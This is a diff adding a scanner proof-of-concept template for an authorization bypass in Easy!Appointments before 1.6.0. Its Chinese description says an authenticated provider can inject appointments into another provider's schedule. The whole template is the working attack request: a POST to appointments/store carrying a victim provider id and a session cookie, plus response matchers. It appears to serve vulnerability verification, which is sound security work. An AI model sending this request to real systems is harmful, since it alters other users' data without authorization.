@@ -1,0 +1,41 @@
+[info]
+author = "AVE"
+description = "验证 Easy!Appointments 1.6.0 之前版本中，已认证服务商可通过 appointments/store 端点向其他服务商日程注入预约的授权绕过漏洞（CWE-639/CWE-862）"
+id = "POC-AVE-2026-0757"
+name = "Easy!Appointments Cross-Provider Appointment Injection PoC"
+severity = "low"
+tags = ["ave-2026-0757"]
+vuln_id = [
+    "CVE-2026-52839",
+    "AVE-2026-0757",
+]
+
+[poc]
+logic = "all"
+
+[[poc.requests]]
+method = "POST"
+path = "/{{BaseURL}}/index.php/appointments/store"
+protocol = "http"
+
+[poc.requests.body]
+content = "id_users_provider={{victim_provider_id}}&book_datetime=2026-08-01+10%3A00%3A00&end_datetime=2026-08-01+10%3A30%3A00&notes=injected&id_services=1&id_users_customer=1"
+type = "raw"
+
+[poc.requests.headers]
+Content-Type = "application/x-www-form-urlencoded"
+Cookie = "{{session}}"
+
+[[poc.requests.matchers]]
+expect = true
+status = [500]
+type = "status"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "Internal Server Error",
+    "Whoops",
+]
